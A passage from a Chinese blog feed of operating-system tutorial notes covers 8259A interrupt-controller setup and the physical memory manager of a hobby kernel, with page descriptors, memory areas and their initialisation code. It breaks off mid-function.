<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_i8259</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 初始化主从8259a</span></span><br><span class="line">	<span class="built_in">out_u8_p</span>(ZIOPT, ICW1);</span><br><span class="line">	<span class="built_in">out_u8_p</span>(SIOPT, ICW1);</span><br><span class="line">	<span class="built_in">out_u8_p</span>(ZIOPT1, ZICW2);</span><br><span class="line">	<span class="built_in">out_u8_p</span>(SIOPT1, SICW2);</span><br><span class="line">	<span class="built_in">out_u8_p</span>(ZIOPT1, ZICW3);</span><br><span class="line">	<span class="built_in">out_u8_p</span>(SIOPT1, SICW3);</span><br><span class="line">	<span class="built_in">out_u8_p</span>(ZIOPT1, ICW4);</span><br><span class="line">	<span class="built_in">out_u8_p</span>(SIOPT1, ICW4);</span><br><span class="line">	<span class="comment">// 屏蔽全部中断源</span></span><br><span class="line">	<span class="built_in">out_u8_p</span>(ZIOPT1, <span class="number">0xff</span>);</span><br><span class="line">	<span class="built_in">out_u8_p</span>(SIOPT1, <span class="number">0xff</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果你要了解 8259A 的细节，就是上述代码中为什么要写入这些数据，你可以自己在 Intel 官方网站上搜索 8259A 的数据手册，自行查看。</p>
]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战07-内存管理</title>
    <url>/2021/11/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9807-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><h2 id="内存页"><a href="#内存页" class="headerlink" title="内存页"></a>内存页</h2><p>我们使用分页模式来管理内存，把物理内存空间分成 4KB 大小页，称为内存页。</p>
<p>由于使用 4KB 进行分页，因此每一个页的起始地址都应该是 0x1000 的倍数，即地址的低 12 位可以可以另作它用。</p>
<p>为了使内存管理高效，我们需要一个结构存放页的状态、页的地址、页的分配记数、页的类型、页的链表，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 内存空间地址描述符标志</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MSADFLGS</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">u32_t</span> mf_olkty:<span class="number">2</span>;    <span class="comment">// 挂入链表的类型</span></span><br><span class="line">    <span class="type">u32_t</span> mf_lstty:<span class="number">1</span>;    <span class="comment">// 是否挂入链表</span></span><br><span class="line">    <span class="type">u32_t</span> mf_mocty:<span class="number">2</span>;    <span class="comment">// 分配类型，被谁占用了，内核还是应用或者空闲</span></span><br><span class="line">    <span class="type">u32_t</span> mf_marty:<span class="number">3</span>;    <span class="comment">// 属于哪个区</span></span><br><span class="line">    <span class="type">u32_t</span> mf_uindx:<span class="number">24</span>;   <span class="comment">// 分配计数</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="type">msadflgs_t</span>; </span><br><span class="line"><span class="comment">// 物理地址和标志  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_PHYADRFLGS</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">u64_t</span> paf_alloc:<span class="number">1</span>;     <span class="comment">// 分配位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_shared:<span class="number">1</span>;    <span class="comment">// 共享位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_swap:<span class="number">1</span>;      <span class="comment">// 交换位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_cache:<span class="number">1</span>;     <span class="comment">// 缓存位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_kmap:<span class="number">1</span>;      <span class="comment">// 映射位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_lock:<span class="number">1</span>;      <span class="comment">// 锁定位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_dirty:<span class="number">1</span>;     <span class="comment">// 脏位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_busy:<span class="number">1</span>;      <span class="comment">// 忙位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_rv2:<span class="number">4</span>;       <span class="comment">// 保留位</span></span><br><span class="line">    <span class="type">u64_t</span> paf_padrs:<span class="number">52</span>;    <span class="comment">// 页物理地址位</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="type">phyadrflgs_t</span>;</span><br><span class="line"><span class="comment">// 内存空间地址描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MSADSC</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_h_t</span> md_list;           <span class="comment">// 链表，可以方便它挂入到其他数据结构中。</span></span><br><span class="line">    <span class="type">spinlock_t</span> md_lock;         <span class="comment">// 保护自身的自旋锁</span></span><br><span class="line">    <span class="type">msadflgs_t</span> md_indxflgs;     <span class="comment">// 内存空间地址描述符标志</span></span><br><span class="line">    <span class="type">phyadrflgs_t</span> md_phyadrs;    <span class="comment">// 物理地址和标志</span></span><br><span class="line">    <span class="type">void</span>* md_odlink;            <span class="comment">// 相邻且相同大小 msadsc 的指针</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="type">msadsc_t</span>;</span><br></pre></td></tr></table></figure>
<p>msadsc_t 结构看似很大，实则很小，因为它表示一个页面，物理内存页有多少就需要有多少个 msadsc_t 结构。</p>
<p>实际上一个 msadsc_t 结构占 40 字节，4KB * 100KB &#x3D; 1G，所以按需要 10M 的内存空间才可以存下表示 1G 内存空间的 msadsc_t 结构。</p>
<p>正是因为页面地址总是按 4KB 对齐， 所以 phyadrflgs_t 结构的低 12 位才可以另作它用。</p>
<p>除了分配计数，msadflgs_t 结构中的其他部分都是用来描述 msadsc_t 结构本身信息的。</p>
<h2 id="内存区"><a href="#内存区" class="headerlink" title="内存区"></a>内存区</h2><p>我们把物理内存分成三个区，分别为硬件区，内核区，应用区。</p>
<p>硬件区，它占用物理内存低端区域，地址区间为 <code>0~32MB</code>。因为很多外部硬件只能访问低于 24MB 的物理内存，所以需要硬件区。</p>
<p>内核区，内核也要使用内存，但是内核同样也是运行在虚拟地址空间，就需要有一段物理内存空间和内核的虚拟地址空间是线性映射关系。</p>
<p>应用区，这个区域主是给应用用户态程序使用。应用程序使用虚拟地址空间，一开始并不会为应用一次性分配完所需的所有物理内存，而是按需分配，即应用用到一页就分配一个页。<br>如果访问到一个没有与物理内存页建立映射关系的虚拟内存页，这时候 CPU 就会产生缺页异常。最终这个缺页异常由操作系统处理，操作系统会分配一个物理内存页，并建好映射关系。</p>
<p>下面为内存区的数据结构。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MA_TYPE_HWAD 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_TYPE_KRNL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_TYPE_PROC 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_HWAD_LSTART 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_HWAD_LSZ 0x2000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_HWAD_LEND (MA_HWAD_LSTART+MA_HWAD_LSZ-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_KRNL_LSTART 0x2000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_KRNL_LSZ (0x40000000-0x2000000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_KRNL_LEND (MA_KRNL_LSTART+MA_KRNL_LSZ-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_PROC_LSTART 0x40000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_PROC_LSZ (0xffffffff-0x40000000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_PROC_LEND (MA_PROC_LSTART+MA_PROC_LSZ)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MEMAREA</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_h_t</span> ma_list;             <span class="comment">//内存区自身的链表</span></span><br><span class="line">    <span class="type">spinlock_t</span> ma_lock;           <span class="comment">//保护内存区的自旋锁</span></span><br><span class="line">    <span class="type">uint_t</span> ma_stus;               <span class="comment">//内存区的状态</span></span><br><span class="line">    <span class="type">uint_t</span> ma_flgs;               <span class="comment">//内存区的标志 </span></span><br><span class="line">    <span class="type">uint_t</span> ma_type;               <span class="comment">//内存区的类型</span></span><br><span class="line">    <span class="type">sem_t</span> ma_sem;                 <span class="comment">//内存区的信号量</span></span><br><span class="line">    <span class="type">wait_l_head_t</span> ma_waitlst;     <span class="comment">//内存区的等待队列</span></span><br><span class="line">    <span class="type">uint_t</span> ma_maxpages;           <span class="comment">//内存区总的页面数</span></span><br><span class="line">    <span class="type">uint_t</span> ma_allocpages;         <span class="comment">//内存区分配的页面数</span></span><br><span class="line">    <span class="type">uint_t</span> ma_freepages;          <span class="comment">//内存区空闲的页面数</span></span><br><span class="line">    <span class="type">uint_t</span> ma_resvpages;          <span class="comment">//内存区保留的页面数</span></span><br><span class="line">    <span class="type">uint_t</span> ma_horizline;          <span class="comment">//内存区分配时的水位线</span></span><br><span class="line">    <span class="type">adr_t</span> ma_logicstart;          <span class="comment">//内存区开始地址</span></span><br><span class="line">    <span class="type">adr_t</span> ma_logicend;            <span class="comment">//内存区结束地址</span></span><br><span class="line">    <span class="type">uint_t</span> ma_logicsz;            <span class="comment">//内存区大小</span></span><br><span class="line">    <span class="comment">//还有一些结构我们这里不关心。后面才会用到</span></span><br><span class="line">&#125;<span class="type">memarea_t</span>；</span><br></pre></td></tr></table></figure>

<p>挂载 msadsc_t 结构的数据结构，它其中需要锁、状态、msadsc_t 结构数量，挂载 msadsc_t 结构的链表、和一些统计数据。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_BAFHLST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">spinlock_t</span> af_lock;    <span class="comment">//保护自身结构的自旋锁</span></span><br><span class="line">    <span class="type">u32_t</span> af_stus;         <span class="comment">//状态 </span></span><br><span class="line">    <span class="type">uint_t</span> af_oder;        <span class="comment">//页面数的位移量</span></span><br><span class="line">    <span class="type">uint_t</span> af_oderpnr;     <span class="comment">//oder对应的页面数比如 oder为2那就是1&lt;&lt;2=4</span></span><br><span class="line">    <span class="type">uint_t</span> af_fobjnr;      <span class="comment">//多少个空闲msadsc_t结构，即空闲页面</span></span><br><span class="line">    <span class="type">uint_t</span> af_mobjnr;      <span class="comment">//此结构的msadsc_t结构总数，即此结构总页面</span></span><br><span class="line">    <span class="type">uint_t</span> af_alcindx;     <span class="comment">//此结构的分配计数</span></span><br><span class="line">    <span class="type">uint_t</span> af_freindx;     <span class="comment">//此结构的释放计数</span></span><br><span class="line">    <span class="type">list_h_t</span> af_frelst;    <span class="comment">//挂载此结构的空闲msadsc_t结构</span></span><br><span class="line">    <span class="type">list_h_t</span> af_alclst;    <span class="comment">//挂载此结构已经分配的msadsc_t结构</span></span><br><span class="line">&#125;<span class="type">bafhlst_t</span>;</span><br></pre></td></tr></table></figure>
<p>为了更高效，这里会将不同的大小的内存进行分割，相关结构如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MDIVMER_ARR_LMAX 52</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MEMDIVMER</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">spinlock_t</span> dm_lock;      <span class="comment">//保护自身结构的自旋锁</span></span><br><span class="line">    <span class="type">u32_t</span> dm_stus;           <span class="comment">//状态</span></span><br><span class="line">    <span class="type">uint_t</span> dm_divnr;         <span class="comment">//内存分配次数</span></span><br><span class="line">    <span class="type">uint_t</span> dm_mernr;         <span class="comment">//内存合并次数</span></span><br><span class="line">    <span class="type">bafhlst_t</span> dm_mdmlielst[MDIVMER_ARR_LMAX];<span class="comment">//bafhlst_t结构数组</span></span><br><span class="line">    <span class="type">bafhlst_t</span> dm_onemsalst;  <span class="comment">//单个的bafhlst_t结构</span></span><br><span class="line">&#125;<span class="type">memdivmer_t</span>;</span><br></pre></td></tr></table></figure>
<p>下图为页面组织结构示意图。</p>
<img src="/2021/11/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9807-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E9%A1%B5%E9%9D%A2%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84%E7%A4%BA%E6%84%8F%E5%9B%BE.png" class="">

<h1 id="实现内存管理"><a href="#实现内存管理" class="headerlink" title="实现内存管理"></a>实现内存管理</h1><p>内存管理的关键函数 init_memmgr 在 <code>cosmos/hal/x86/memmgrinit.c</code> 文件中, 该函数为物理内存管理器初始化的大总管,代码如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//cosmos/hal/x86/halmm.c中</span></span><br><span class="line"><span class="comment">//hal层的内存初始化函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_halmm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">init_phymmarge</span>();</span><br><span class="line">    <span class="built_in">init_memmgr</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Cosmos物理内存管理器初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_memmgr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化内存页结构msadsc_t</span></span><br><span class="line">    <span class="comment">//初始化内存区结构memarea_t</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 init_memmgr 函数中应该要完成内存页结构 msadsc_t 和内存区结构 memarea_t 的初始化。</p>
<p>下图为内存管理的时序图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">halmm.c -&gt; memmgrinit.c : init_memmgr 内存管理器初始化。</span><br><span class="line">memmgrinit.c -&gt; msadsc.c : init_msadsc 初始化内存页结构 msadsc_t 。</span><br><span class="line">msadsc.c -&gt; msadsc.c : ret_msadsc_vadrandsz 计算 msadsc_t 结构数组的开始地址和数组元素个数。</span><br><span class="line">msadsc.c -&gt; msadsc.c : init_msadsc_core 初始化 msadsc_t 结构数组。</span><br><span class="line">memmgrinit.c -&gt; memarea.c : init_memarea 初始化内存区。</span><br><span class="line">memarea.c -&gt; memarea.c : init_memarea_core 设置硬件区、内核区、应用区。</span><br><span class="line">memmgrinit.c -&gt; msadsc.c : init_search_krloccupymm 初始化搜索内核占用的内存页面。</span><br><span class="line">msadsc.c -&gt; msadsc.c : search_krloccupymsadsc_core 搜索内核占用的内存页面。</span><br><span class="line">msadsc.c -&gt; msadsc.c : search_segment_occupymsadsc 搜索内核占用的内存页，并设置相应的 msadsc_t 结构。</span><br><span class="line">memmgrinit.c -&gt; memarea.c : init_merlove_mem 初始化页面合并。</span><br><span class="line">memarea.c -&gt; memarea.c : merlove_mem_core 合并内存页。</span><br><span class="line">memarea.c -&gt; memarea.c : merlove_setallmarflgs_onmemarea 给 msadsc_t 结构打上标签</span><br><span class="line">memarea.c -&gt; memarea.c : merlove_mem_onmemarea 根据内存区 memarea_t 结构对内存页 msadsc_t 结构进行合并。</span><br><span class="line">memarea.c -&gt; memarea.c : merlove_scan_continumsadsc 获取最多且地址连续的内存页 msadsc_t 结构体的开始、结束地址、个数。</span><br><span class="line">memarea.c -&gt; memarea.c : merlove_continumsadsc_mareabafh 把一组连续的内存页 msadsc_t 结构体挂载到合适的 m_mdmlielst 数组中的 bafhlst_t 结构中，实现内存合并。</span><br><span class="line">memarea.c -&gt; memarea.c : continumsadsc_mareabafh_core 内存合并的具体实现。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<h2 id="内存页结构初始化"><a href="#内存页结构初始化" class="headerlink" title="内存页结构初始化"></a>内存页结构初始化</h2><p>内存页的初始化实现代码在 <code>cosmos/hal/x86/msadsc.c</code> 文件中，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">write_one_msadsc</span><span class="params">(<span class="type">msadsc_t</span> *msap, <span class="type">u64_t</span> phyadr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//对msadsc_t结构做基本的初始化，比如链表、锁、标志位</span></span><br><span class="line">    <span class="built_in">msadsc_t_init</span>(msap);</span><br><span class="line">    <span class="comment">//这是把一个64位的变量地址转换成phyadrflgs_t*类型方便取得其中的地址位段</span></span><br><span class="line">    <span class="type">phyadrflgs_t</span> *tmp = (<span class="type">phyadrflgs_t</span> *)(&amp;phyadr);</span><br><span class="line">    <span class="comment">//把页的物理地址写入到msadsc_t结构中</span></span><br><span class="line">    msap-&gt;md_phyadrs.paf_padrs = tmp-&gt;paf_padrs;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">u64_t</span> <span class="title">init_msadsc_core</span><span class="params">(<span class="type">machbstart_t</span> *mbsp, <span class="type">msadsc_t</span> *msavstart, <span class="type">u64_t</span> msanr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取phymmarge_t结构数组开始地址</span></span><br><span class="line">    <span class="type">phymmarge_t</span> *pmagep = (<span class="type">phymmarge_t</span> *)<span class="built_in">phyadr_to_viradr</span>((<span class="type">adr_t</span>)mbsp-&gt;mb_e820expadr);</span><br><span class="line">    <span class="type">u64_t</span> mdindx = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//扫描phymmarge_t结构数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">u64_t</span> i = <span class="number">0</span>; i &lt; mbsp-&gt;mb_e820exnr; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//判断phymmarge_t结构的类型是不是可用内存</span></span><br><span class="line">        <span class="keyword">if</span> (PMR_T_OSAPUSERRAM == pmagep[i].pmr_type)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//遍历phymmarge_t结构的地址区间</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">u64_t</span> start = pmagep[i].pmr_saddr; start &lt; pmagep[i].pmr_end; start += <span class="number">4096</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//每次加上4KB-1比较是否小于等于phymmarge_t结构的结束地址</span></span><br><span class="line">                <span class="keyword">if</span> ((start + <span class="number">4096</span> - <span class="number">1</span>) &lt;= pmagep[i].pmr_end)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//与当前地址为参数写入第mdindx个msadsc结构</span></span><br><span class="line">                    <span class="built_in">write_one_msadsc</span>(&amp;msavstart[mdindx], start);</span><br><span class="line">                    mdindx++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mdindx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_msadsc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">u64_t</span> coremdnr = <span class="number">0</span>, msadscnr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">msadsc_t</span> *msadscvp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">machbstart_t</span> *mbsp = &amp;kmachbsp;</span><br><span class="line">    <span class="comment">//计算msadsc_t结构数组的开始地址和数组元素个数</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ret_msadsc_vadrandsz</span>(mbsp, &amp;msadscvp, &amp;msadscnr) == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">system_error</span>(<span class="string">&quot;init_msadsc ret_msadsc_vadrandsz err\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始真正初始化msadsc_t结构数组</span></span><br><span class="line">    coremdnr = <span class="built_in">init_msadsc_core</span>(mbsp, msadscvp, msadscnr);</span><br><span class="line">    <span class="keyword">if</span> (coremdnr != msadscnr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">system_error</span>(<span class="string">&quot;init_msadsc init_msadsc_core err\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将msadsc_t结构数组的开始的物理地址写入kmachbsp结构中 </span></span><br><span class="line">    mbsp-&gt;mb_memmappadr = <span class="built_in">viradr_to_phyadr</span>((<span class="type">adr_t</span>)msadscvp);</span><br><span class="line">    <span class="comment">//将msadsc_t结构数组的元素个数写入kmachbsp结构中 </span></span><br><span class="line">    mbsp-&gt;mb_memmapnr = coremdnr;</span><br><span class="line">    <span class="comment">//将msadsc_t结构数组的大小写入kmachbsp结构中 </span></span><br><span class="line">    mbsp-&gt;mb_memmapsz = coremdnr * <span class="built_in">sizeof</span>(<span class="type">msadsc_t</span>);</span><br><span class="line">    <span class="comment">//计算下一个空闲内存的开始地址 </span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = <span class="built_in">PAGE_ALIGN</span>(mbsp-&gt;mb_memmappadr + mbsp-&gt;mb_memmapsz);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="内存区结构初始化"><a href="#内存区结构初始化" class="headerlink" title="内存区结构初始化"></a>内存区结构初始化</h2><p>内存区结构初始化实现代码在 <code>cosmos/hal/x86/memarea.c</code> 文件，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">bafhlst_t_init</span><span class="params">(<span class="type">bafhlst_t</span> *initp, <span class="type">u32_t</span> stus, <span class="type">uint_t</span> oder, <span class="type">uint_t</span> oderpnr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化bafhlst_t结构体的基本数据</span></span><br><span class="line">    <span class="built_in">knl_spinlock_init</span>(&amp;initp-&gt;af_lock);</span><br><span class="line">    initp-&gt;af_stus = stus;</span><br><span class="line">    initp-&gt;af_oder = oder;</span><br><span class="line">    initp-&gt;af_oderpnr = oderpnr;</span><br><span class="line">    initp-&gt;af_fobjnr = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;af_mobjnr = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;af_alcindx = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;af_freindx = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">list_init</span>(&amp;initp-&gt;af_frelst);</span><br><span class="line">    <span class="built_in">list_init</span>(&amp;initp-&gt;af_alclst);</span><br><span class="line">    <span class="built_in">list_init</span>(&amp;initp-&gt;af_ovelst);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">memdivmer_t_init</span><span class="params">(<span class="type">memdivmer_t</span> *initp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化medivmer_t结构体的基本数据</span></span><br><span class="line">    <span class="built_in">knl_spinlock_init</span>(&amp;initp-&gt;dm_lock);</span><br><span class="line">    initp-&gt;dm_stus = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;dm_divnr = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;dm_mernr = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//循环初始化memdivmer_t结构体中dm_mdmlielst数组中的每个bafhlst_t结构的基本数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint_t</span> li = <span class="number">0</span>; li &lt; MDIVMER_ARR_LMAX; li++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">bafhlst_t_init</span>(&amp;initp-&gt;dm_mdmlielst[li], BAFH_STUS_DIVM, li, (<span class="number">1UL</span> &lt;&lt; li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">bafhlst_t_init</span>(&amp;initp-&gt;dm_onemsalst, BAFH_STUS_ONEM, <span class="number">0</span>, <span class="number">1UL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">memarea_t_init</span><span class="params">(<span class="type">memarea_t</span> *initp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化memarea_t结构体的基本数据</span></span><br><span class="line">    <span class="built_in">list_init</span>(&amp;initp-&gt;ma_list);</span><br><span class="line">    <span class="built_in">knl_spinlock_init</span>(&amp;initp-&gt;ma_lock);</span><br><span class="line">    initp-&gt;ma_stus = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_flgs = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_type = MA_TYPE_INIT;</span><br><span class="line">    initp-&gt;ma_maxpages = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_allocpages = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_freepages = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_resvpages = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_horizline = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_logicstart = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_logicend = <span class="number">0</span>;</span><br><span class="line">    initp-&gt;ma_logicsz = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//初始化memarea_t结构体中的memdivmer_t结构体</span></span><br><span class="line">    <span class="built_in">memdivmer_t_init</span>(&amp;initp-&gt;ma_mdmdata);</span><br><span class="line">    initp-&gt;ma_privp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool_t</span> <span class="title">init_memarea_core</span><span class="params">(<span class="type">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取memarea_t结构开始地址</span></span><br><span class="line">    <span class="type">u64_t</span> phymarea = mbsp-&gt;mb_nextwtpadr;</span><br><span class="line">    <span class="comment">//检查内存空间够不够放下MEMAREA_MAX个memarea_t结构实例变量</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">initchkadr_is_ok</span>(mbsp, phymarea, (<span class="built_in">sizeof</span>(<span class="type">memarea_t</span>) * MEMAREA_MAX)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">memarea_t</span> *virmarea = (<span class="type">memarea_t</span> *)<span class="built_in">phyadr_to_viradr</span>((<span class="type">adr_t</span>)phymarea);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint_t</span> mai = <span class="number">0</span>; mai &lt; MEMAREA_MAX; mai++)</span><br><span class="line">    &#123;   <span class="comment">//循环初始化每个memarea_t结构实例变量</span></span><br><span class="line">        <span class="built_in">memarea_t_init</span>(&amp;virmarea[mai]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置硬件区的类型和空间大小</span></span><br><span class="line">    virmarea[<span class="number">0</span>].ma_type = MA_TYPE_HWAD;</span><br><span class="line">    virmarea[<span class="number">0</span>].ma_logicstart = MA_HWAD_LSTART;</span><br><span class="line">    virmarea[<span class="number">0</span>].ma_logicend = MA_HWAD_LEND;</span><br><span class="line">    virmarea[<span class="number">0</span>].ma_logicsz = MA_HWAD_LSZ;</span><br><span class="line">    <span class="comment">//设置内核区的类型和空间大小</span></span><br><span class="line">    virmarea[<span class="number">1</span>].ma_type = MA_TYPE_KRNL;</span><br><span class="line">    virmarea[<span class="number">1</span>].ma_logicstart = MA_KRNL_LSTART;</span><br><span class="line">    virmarea[<span class="number">1</span>].ma_logicend = MA_KRNL_LEND;</span><br><span class="line">    virmarea[<span class="number">1</span>].ma_logicsz = MA_KRNL_LSZ;</span><br><span class="line">    <span class="comment">//设置应用区的类型和空间大小</span></span><br><span class="line">    virmarea[<span class="number">2</span>].ma_type = MA_TYPE_PROC;</span><br><span class="line">    virmarea[<span class="number">2</span>].ma_logicstart = MA_PROC_LSTART;</span><br><span class="line">    virmarea[<span class="number">2</span>].ma_logicend = MA_PROC_LEND;</span><br><span class="line">    virmarea[<span class="number">2</span>].ma_logicsz = MA_PROC_LSZ;</span><br><span class="line">    <span class="comment">//将memarea_t结构的开始的物理地址写入kmachbsp结构中 </span></span><br><span class="line">    mbsp-&gt;mb_memznpadr = phymarea;</span><br><span class="line">    <span class="comment">//将memarea_t结构的个数写入kmachbsp结构中 </span></span><br><span class="line">    mbsp-&gt;mb_memznnr = MEMAREA_MAX;</span><br><span class="line">    <span class="comment">//将所有memarea_t结构的大小写入kmachbsp结构中 </span></span><br><span class="line">    mbsp-&gt;mb_memznsz = <span class="built_in">sizeof</span>(<span class="type">memarea_t</span>) * 